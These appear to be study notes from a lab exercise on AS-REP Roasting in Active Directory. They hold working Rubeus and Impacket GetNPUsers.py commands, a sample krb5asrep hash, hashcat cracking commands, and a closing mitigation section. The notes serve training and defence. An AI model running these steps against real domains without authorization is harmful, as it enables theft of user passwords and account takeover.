
**Type:** Kerberos attack  
**Technique:** AS-REP Roasting

## Overview

**AS-REP Roasting** targets Active Directory user accounts that have **Kerberos pre-authentication disabled**.

Unlike [[Kerberoasting]], the target:
- Does **not** need to be a service account.
- Does **not** need an SPN.
- Only needs **Kerberos pre-authentication disabled**.

The attacker requests an **AS-REP** for the vulnerable user and obtains encrypted material that can be cracked **offline** to recover the user's password.

### Attack flow

```text
Enumerate users
      ↓
Find users with pre-authentication disabled
      ↓
Request AS-REP
      ↓
Obtain krb5asrep hash
      ↓
Offline password cracking
      ↓
Recover user password
```

### Vulnerable configuration

```text
Do not require Kerberos preauthentication
```

---

# Why Does It Work?

Normally, Kerberos uses **pre-authentication** to prove that the client knows the user's password before the KDC returns an AS-REP.

Simplified:

```text
User
 │
 │ AS-REQ + Pre-Authentication
 ▼
KDC
 │
 │ Validate pre-authentication
 ▼
AS-REP / TGT
```

When pre-authentication is disabled:

```text
Attacker
 │
 │ AS-REQ
 ▼
KDC
 │
 │ Pre-authentication NOT required
 ▼
AS-REP
 │
 ▼
Encrypted material
 │
 ▼
Offline password cracking
```

The AS-REP contains data encrypted using a key derived from the user's password.

Therefore, the attacker can attempt to recover the password **offline** without repeatedly authenticating against the Domain Controller.

---

# 1. AS-REP Roasting with Rubeus

Rubeus can automatically search for users with Kerberos pre-authentication disabled and request their AS-REP responses.

### Command

```cmd
Rubeus.exe asreproast
```

### Explanation

| Command        | Meaning                                                      |
| -------------- | ------------------------------------------------------------ |
| `Rubeus.exe`   | Execute Rubeus.                                              |
| `asreproast`   | Find AS-REP roastable users and request their AS-REP hashes. |

Rubeus automatically identifies vulnerable users, so you don't need to provide a username list.

The resulting hash can be transferred to the attacking machine and cracked with Hashcat.

---

# 2. AS-REP Roasting with GetNPUsers.py

Impacket provides:

```text
GetNPUsers.py
```

It can check a list of domain users for accounts with Kerberos pre-authentication disabled and request AS-REP responses.
### Tool path
```text
/home/eyad/.local/share/pipx/venvs/impacket/bin
```
### Command
```bash
GetNPUsers.py spookysec.local/ \
    -usersfile userlist.txt \
    -no-pass \
    -dc-ip <TARGET_IP>
```

### Options

|Option|Meaning|
|---|---|
|`spookysec.local/`|Target AD domain|
|`-usersfile`|File containing usernames|
|`-no-pass`|Don't provide credentials|
|`-dc-ip`|Domain Controller IP|

### Example
```bash
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ \
    -usersfile userlist.txt \
    -no-pass \
    -dc-ip 10.10.10.10
```

If a vulnerable account is found, you may receive:
```text
$krb5asrep$23$svc-admin@THM-AD:f696dd4f7d6318571da51fe3cd795c6b$781221de5836f42ae8583df7cd6dcb92fe300c45f5061d186c7f1225d66e...
```

This is an **AS-REP hash** that can be taken offline for password cracking.

### Rubeus vs. GetNPUsers.py

| Tool          | User discovery                                    |
| ------------- | ------------------------------------------------- |
| Rubeus        | Automatically finds AS-REP roastable users        |
| GetNPUsers.py | Usually requires a username list and it is remote |

---

# 3. Crack AS-REP Hashes

Save the extracted hash into:
```bash
hash.txt
```

For the Hashcat format used with the Rubeus output, the hash should contain:
```text
$krb5asrep$23$
```

For example:
```text
$krb5asrep$23$User@DOMAIN:...
```

### Hashcat
```bash
hashcat -m 18200 -a 0 hash.txt rockyou.txt
```

Show recovered passwords:
```bash
hashcat -m 18200 hash.txt --show
```

Example output:
```text
$krb5asrep$23$svc-admin@THM-AD:...:password
```

---

# 4. Rubeus vs. GetNPUsers.py

Both tools can perform AS-REP Roasting, but their workflow is slightly different.

### Rubeus
```cmd
Rubeus.exe asreproast
```

Automatically:
```text
Find vulnerable users
        ↓
Request AS-REP
        ↓
Output hashes
```

### GetNPUsers.py

```bash
GetNPUsers.py DOMAIN/ \
    -usersfile users.txt \
    -no-pass \
    -dc-ip <DC_IP>
```

Typically:
```text
Obtain username list
        ↓
Test users
        ↓
Find vulnerable users
        ↓
Request AS-REP
        ↓
Output hashes
```

**Rubeus is convenient when operating from a Windows domain-joined machine, while `GetNPUsers.py` is useful for performing the attack remotely from an attacker machine.**

---

# 5. AS-REP Roasting vs. Kerberoasting

| |AS-REP Roasting|Kerberoasting|
|---|---|---|
|Target|User with pre-auth disabled|Account with an SPN|
|Service account required?|No|Usually|
|SPN required?|No|Yes|
|Ticket/material|AS-REP|TGS|
|Rubeus|`asreproast`|`kerberoast`|
|Hashcat|`18200`|`13100`|

---

# 6. Mitigation

### Keep Kerberos Pre-Authentication Enabled

The primary mitigation is to **keep Kerberos pre-authentication enabled**.
Only disable it when there is a legitimate requirement.

### Use Strong Passwords

AS-REP hashes can be attacked offline.
Strong, unique passwords make cracking significantly more difficult.

### Avoid Weak Service/User Passwords

Even though the target does not need to be a service account, weak passwords make the attack much more effective.

### Monitor for AS-REP Roasting

Monitor Kerberos authentication activity for unusual AS-REQ requests involving accounts that do not normally perform such authentication.

---

# Key Point

> **AS-REP Roasting targets accounts with Kerberos pre-authentication disabled.**

The attack is:

```text
Enumerate users
    ↓
Find accounts without pre-authentication
    ↓
Request AS-REP
    ↓
Obtain krb5asrep hash
    ↓
Crack hash offline
    ↓
Recover user's password
```